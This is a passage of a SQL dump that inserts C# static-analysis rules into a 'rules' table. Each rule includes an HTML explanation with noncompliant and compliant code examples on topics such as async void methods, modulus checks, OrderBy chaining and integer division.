var anon = new
{
  X,
  Y = "my string"
};
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy,finding', false, 'HTML', 1510817812276, 1510817812277, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (415, 'Statements should be on separate lines', 'S122', NULL, 'csharpsquid', '<p>
    For better readability, do not put more than one statement on a single line.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if(someCondition) doSomething();
</pre>

<h2>Compliant Solution</h2>

<pre>
if(someCondition) {
  doSomething();
}
</pre>

<h2>Exceptions</h2>
<p>
    Anonymous functions containing a single statement are ignored. Block statements are not considered either.
</p>
<pre>
Func&lt;object, bool&gt; item1 = o =&gt; { return true; }; // Compliant
Func&lt;object, bool&gt; item1 = o =&gt; { var r = false; return r; }; // Noncompliant
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817812278, 1510817812278, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (416, 'Modulus results should not be checked for direct equality', 'S2197', NULL, 'csharpsquid', '<p>
    When the modulus of a negative number is calculated, the result will either be negative or zero. Thus, comparing the modulus
    of a variable for equality with a positive number (or a negative one) could result in unexpected results.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public boo IsOdd(int x)
{
  return x % 2 == 1;  // Noncompliant; if x is an odd negative, x % 2 == -1
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public bool IsOdd(int x)
{
  return x % 2 != 0;
}
</pre>
or
<pre>
public bool IsOdd(uint x)
{
  return x % 2 == 1;
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812279, 1510817812279, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (417, '"async" methods should not return "void"', 'S3168', NULL, 'csharpsquid', '<p>
    An async method with a void return type is a "fire and forget" method best reserved for event handlers because there''s no way to wait for the method''s execution to complete and respond accordingly. There''s also no way to catch exceptions thrown from the method.
</p>
<p>
    Having an async void method that is not an event handler could mean your program works some times and not others because of timing issues. Instead, async methods should return Task.
</p>
<p>
    This rule raises an issue when non-event handler methods are both async and void.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class HttpPrinter
{
  private string content;

  public async void CallNetwork(string url) //Noncompliant
  {
    var client = new HttpClient();
    var response = await client.GetAsync(url);
    content = await response.Content.ReadAsStringAsync();
  }

  public async Task PrintContent(string url)  // works correctly if web request finishes in under 1 second, otherwise content will be null
  {
    CallNetwork(url);
    await Task.Delay(1000);
    Console.Write(content);
  }
}
</pre>

<h2>Compliant Solution</h2>

<pre>
class HttpPrinter
{
  private string content;

  public async Task CallNetwork(string url)
  {
    var client = new HttpClient();
    var response = await client.GetAsync(url);
    content = await response.Content.ReadAsStringAsync();
  }

  public async Task PrintContent(string url)
  {
    await CallNetwork(url); // &lt;----- call changed here. If await is not added warning CS4014 will be triggered
    await Task.Delay(1000);
    Console.Write(content);
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817812280, 1510817812280, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (418, 'Type examining methods should be avoided on "System.Type" instances', 'S3443', NULL, 'csharpsquid', '<p>
    If you call <code>GetType()</code> on a <code>Type</code> variable, the return value will always be <code>typeof(System.Type)</code>. So there''s no real 
    point in making that call. The same applies to passing a type argument to <code>IsInstanceOfType</code>. In both cases the results are entirely 
    predictable.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var type = typeof(int);
var ttype = type.GetType(); //Noncompliant, always typeof(System.Type)

var s = "abc";

if (s.GetType().IsInstanceOfType(typeof(string))) //Noncompliant; false
{ /* ... */ }
</pre>

<h2>Compliant Solution</h2>
<pre>
var s = "abc";

if (s.GetType().IsInstanceOfType("ssss"))
{ /* ... */ }
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812281, 1510817812281, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (419, 'Unused private types or members should be removed', 'S1144', NULL, 'csharpsquid', '<p>
    Private types or members that are never executed or referenced are dead code: unnecessary, inoperative code that
    should be removed. Cleaning out dead code decreases the size of the maintained codebase, making it easier to
    understand the program and preventing bugs from being introduced.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  private void UnusedPrivateMethod() {...} // Noncompliant

  private class UnusedClass {...} // Noncompliant
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  private Foo()
  {
    UsedPrivateMethod();
  }

  private void UsedPrivateMethod()
  {
    var c = new UsedClass();
  }

  private class UsedClass {...}
}
</pre>

<h2>Exceptions</h2>
<p>
    This rule doesn''t raise any issue on empty constructors and attributed members.
</p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unused', false, 'HTML', 1510817812282, 1510817812282, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (420, 'Control structures should use curly braces', 'S121', NULL, 'csharpsquid', '<p>
  While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
// the two statements seems to be attached to the if statement, but that is only true for the first one:
if (condition)
  executeSomething();
  checkSomething();
</pre>

<h2>Compliant Solution</h2>
<pre>
if (condition)
{
  executeSomething();
  checkSomething();
}
</pre>

<h2>See</h2>

<ul>
    <li>MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement</li>
    <li>MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a compound statement, or another if statement</li>
    <li>MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement</li>
    <li>MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a compound statement, or another if statement</li>
    <li>MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement</li>
    <li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C</a> - Use braces for the body of an if, for, or while statement</li>
    <li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,cwe,misra,pitfall', false, 'HTML', 1510817812284, 1510817812285, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (421, 'Methods should not be too complex', 'S1541', NULL, 'csharpsquid', '<p>The cyclomatic complexity of a function should not exceed a defined threshold.</p>
<p>Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.</p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812287, 1510817812288, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (422, 'Useless "if(true) {...}" and "if(false){...}" blocks should be removed', 'S1145', NULL, 'csharpsquid', '<p>
  <code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. This can be useful during debugging, but should not be checked in. <code>if</code> statements with conditions that are always true are completely redundant, and make the code less readable.
</p>
<p>
In either case, unconditional <code>if</code> statements should be removed.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (true)
{
  doSomething();
}
...
if (false)
{
  doSomethingElse();
}
</pre>

<h2>Compliant Solution</h2>
<pre>
doSomething();
...
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cwe,misra', false, 'HTML', 1510817812290, 1510817812294, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (424, 'Multiple "OrderBy" calls should not be used', 'S3169', NULL, 'csharpsquid', '<p>
    There''s no point in chaining multiple <code>OrderBy</code> calls in a LINQ; only the last one will be reflected in the result
    because each subsequent call completely reorders the list. Thus, calling <code>OrderBy</code> multiple times is a performance
    issue as well, because all of the sorting will be executed, but only the result of the last sort will be kept.
</p>
<p>
    Instead, use <code>ThenBy</code> for each call after the first.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var x = personList
  .OrderBy(person => person.Age)
  .OrderBy(person => person.Name)  // Noncompliant
  .ToList();  // x is sorted by Name, not sub-sorted
</pre>

<h2>Compliant Solution</h2>
<pre>
var x = personList
  .OrderBy(person => person.Age)
  .ThenBy(person => person.Name)
  .ToList();
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'performance', false, 'HTML', 1510817812297, 1510817812297, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (425, 'Parameters should be passed in the correct order', 'S2234', NULL, 'csharpsquid', '<p>
    When the names of parameters in a method call match the names of the method arguments,
    it contributes to clearer, more readable code. However, when the names match, but are
    passed in a different order than the method arguments, it indicates a mistake in the
    parameter order which will likely lead to unexpected results.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public double divide(int divisor, int dividend)
{
  return divisor/dividend;
}

public void doTheThing()
{
  int divisor = 15;
  int dividend = 5;

  double result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected
  //...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public double divide(int divisor, int dividend)
{
  return divisor/dividend;
}

public void doTheThing()
{
  int divisor = 15;
  int dividend = 5;

  double result = divide(divisor, dividend);
  //...
}
</pre>', 4, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812298, 1510817812298, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (426, '"[Optional]" should not be used on "ref" or "out" parameters', 'S3447', NULL, 'csharpsquid', '<p>
    The use of <code>ref</code> or <code>out</code> in combination with <code>[Optional]</code> is both confusing and contradictory.
    <code>[Optional]</code> indicates that the parameter doesn''t have to be provided, while out and ref mean that the parameter will be used
    to return data to the caller (<code>ref</code> additionally indicates that the parameter may also be used to pass data into the method).
</p>
<p>
    Thus, making it <code>[Optional]</code> to provide the parameter in which you will be passing back the method results doesn''t make sense.
    In fact, the compiler will raise an error on such code. Unfortunately, it raises the error on method calls where the
    <code>[Optional]</code> parameter has been omitted, not the source of the problem, the method declaration.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
    public void DoStuff([Optional] ref int i) // Noncompliant
    {
        Console.WriteLine(i);
    }

    public static void Main()
    {
        new MyClass().DoStuff(); // This doesn''t compile, CS7036 shows
    }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class MyClass
{
  public void DoStuff(ref int i)
  {
    Console.WriteLine(i);
  }

  public static void Main()
  {
    var i = 42;
    new MyClass().DoStuff(ref i);
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812299, 1510817812299, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (427, '"switch" statements should have at least 3 "case" clauses', 'S1301', NULL, 'csharpsquid', '<p>
    <code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.
</p>
<p>
    For just one or two cases however, the code will be more readable with <code>if</code> statements.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
switch (variable)
{
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
if (variable == 0)
{
  doSomething();
} else
{
  doSomethingElse();
}
</pre>

<h2>See</h2>
<ul>
    <li>MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause.</li>
    <li>MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause.</li>
    <li>MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses</li>
</ul>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra', false, 'HTML', 1510817812300, 1510817812301, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (428, '"ThreadStatic" fields should not be initialized', 'S2996', NULL, 'csharpsquid', '<p>
    When an object has a field annotated with <code>ThreadStatic</code>, that field is shared within a given thread,
    but unique across threads. Since a class'' static initializer is only invoked for the
    first thread created, it also means that only the first thread will have the expected initial values.
</p>
<p>
    Instead, allow such fields to be initialized to their default values or make the initialization lazy.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  [ThreadStatic]
  public static object PerThreadObject = new object(); // Noncompliant. Will be null in all the threads except the first one.
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  [ThreadStatic]
  public static object _perThreadObject;
  public static object PerThreadObject
  {
    get
    {
      if (_perThreadObject == null)
      {
        _perThreadObject = new object();
      }
      return _perThreadObject;
    }
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'multi-threading', false, 'HTML', 1510817812301, 1510817812302, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (429, 'Boolean checks should not be inverted', 'S1940', NULL, 'csharpsquid', '<p>
    It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if ( !(a == 2)) { ... }  // Noncompliant
bool b = !(i < 10);  // Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
if (a != 2) { ... }
bool b = (i >= 10);
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812303, 1510817812303, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (430, 'Fields should be private', 'S2357', NULL, 'csharpsquid', '<p>
    Fields should not be part of an API, and therefore should always be private. Indeed, they
    cannot be added to an interface for instance, and validation cannot be added later on without
    breaking backward compatiblity. Instead, developers should encapsulate their fields into
    properties. Explicit property getters and setters can be introduced for validation purposes
    or to smooth the transition to a newer system.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  public int MagicNumber = 42;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  public int MagicNumber
  {
    get { return 42; }
  }
}
</pre>
or
<pre>
public class Foo
{
  private int MagicNumber = 42;
}
</pre>

<h2>Exceptions</h2>
<p>
    <code>static</code> and <code>const</code> fields are ignored.
</p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812304, 1510817812304, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (431, '"Object.ReferenceEquals" should not be used for value types', 'S2995', NULL, 'csharpsquid', '<p>
    Using <code>Object.ReferenceEquals</code> to compare the references of two value types simply won''t return the
    expected results most of the time because such types are passed by value, not by reference.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  private MyStruct myStruct;

  public void DoSomething(MyStruct s1) {
    int a = 1;
    int b = 1;

    if (Object.ReferenceEquals(myStruct, s1))  // Noncompliant; this can never be true
    {
      // ...
    }
    else if (Object.ReferenceEquals(a,b)) // Noncompliant
    {
      // ...
    }
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817812305, 1510817812306, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (432, 'Nested blocks of code should not be left empty', 'S108', NULL, 'csharpsquid', '<p>
Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 0; i < 42; i++) {}  // Empty on purpose or missing piece of code ?
</pre>

<h2>Exceptions</h2>
<p>
    When a block contains a comment, this block is not considered to be empty.
</p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812306, 1510817812307, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (437, 'Result of integer division should not be assigned to floating point variable', 'S2184', NULL, 'csharpsquid', '<p>
    When division is performed on <code>int</code>s, the result will always be an <code>int</code>. You can assign that result to a
    <code>double</code>, <code>float</code> or <code>decimal</code> with automatic type conversion, but having started as an
    <code>int</code>, the result will likely not be what you expect. If the result of <code>int</code> division is assigned to a
    floating-point variable, precision will have been lost before the assignment. Instead, at least one operand should be cast or
    promoted to the final type before the operation takes place.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
static void Main()
{
  decimal dec = 3/2; // Noncompliant
  Method(3/2); // Noncompliant
}
static void Method(float f) { }
</pre>
<h2>Compliant Solution</h2>
<pre>
static void Main()
{
  decimal dec = (decimal)3/2;
  Method(3.0F/2);
}
static void Method(float f) { }
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cwe,sans-top25-risky', false, 'HTML', 1510817812315, 1510817812315, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (438, '"goto" statement should not be used', 'S907', NULL, 'csharpsquid', '<p>
    <code>goto</code> is an unstructured control flow statement. It makes code less readable and maintainable.
    Structured control flow statements such as <code>if</code>, <code>for</code>, <code>while</code>,
    <code>continue</code> or <code>break</code> should be used instead.
</p>

<h2>See</h2>

<ul>
    <li>MISRA C:2004, 14.4 - The goto statement shall not be used.</li>
    <li>MISRA C:2012, 15.1 - The goto statement should not be used</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'brain-overload,misra', false, 'HTML', 1510817812316, 1510817812317, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (439, 'Console logging should not be used', 'S2228', NULL, 'csharpsquid', '<p>
    Debug statements are always useful during development. But include them in production code - particularly
    in code that runs client-side - and you run the risk of inadvertently exposing sensitive information.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
private void DoSomething ()
{
  // ...
  Console.WriteLine ("so far, so good..."); // Noncompliant
  // ...
}
</pre>


<h2>See</h2>

<ul>
    <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'owasp-a6', false, 'HTML', 1510817812317, 1510817812318, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (440, 'Variables should not be self-assigned', 'S1656', NULL, 'csharpsquid', '<p>
There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake and some other value or variable was intended for the assignment instead.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public void setName(string name)
{
    name = name;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public void setName(string name)
{
    this.name = name;
}
</pre>

<h2>See</h2>

<ul>
    <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>
    <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '3min', NULL, NULL, 'cert', false, 'HTML', 1510817812318, 1510817812319, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (441, 'Multiple variables should not be declared on the same line', 'S1659', NULL, 'csharpsquid', '<p>
    Declaring multiple variable on one line is difficult to read.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
  private int a, b; // Noncompliant

  public void Method()
  {
    int c, d; // Noncompliant
  }
}
</pre>

<h2>Compliant Solution</h2>

<pre>
class MyClass
{
  private int a;
  private int b;

  public void Method()
  {
    int c;
    int d;
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817812319, 1510817812320, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (442, '"base.Equals" should not be used to check for reference equality in "Equals" if "base" is not "object"', 'S3397', NULL, 'csharpsquid', '<p>
    <code>object.Equals()</code> overrides can be optimized by checking first for reference equality between <code>this</code> and the
    parameter. This check can be implemented by calling <code>object.ReferenceEquals()</code> or <code>base.Equals()</code>, where
    <code>base</code> is <code>object</code>. However, using <code>base.Equals()</code> is a maintenance hazard because while it works
    if you extend <code>Object</code> directly, if you introduce a new base class that overrides <code>Equals</code>, it suddenly stops
    working.
</p>
<p>
    This rule raises an issue if <code>base.Equals()</code> is used but <code>base</code> is not <code>object</code>.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
class Base
{
  private int baseField;

  public override bool Equals(object other)
  {
    if (base.Equals(other)) // Okay; base is object
    {
      return true;
    }

    return this.baseField == ((Base)other).baseField;
  }
}

class Derived : Base
{
  private int derivedField;

  public override bool Equals(object other)
  {
    if (base.Equals(other))  // Noncompliant
    {
      return true;
    }

    return this.derivedField == ((Derived)other).derivedField;
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class Base
{
  private int baseField;

  public override bool Equals(object other)
  {
    if (object.ReferenceEquals(this, other))  // base.Equals is okay here, but object.ReferenceEquals is better
    {
      return true;
    }

    return this.baseField == ((Base)other).baseField;
  }
}

class Derived : Base
{
  private int derivedField;

  public override bool Equals(object other)
  {
    if (object.ReferenceEquals(this, other))
    {
      return true;
    }

    return base.Equals(other) &amp;&amp; this.derivedField == ((Derived)other).derivedField;
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812320, 1510817812321, 2);
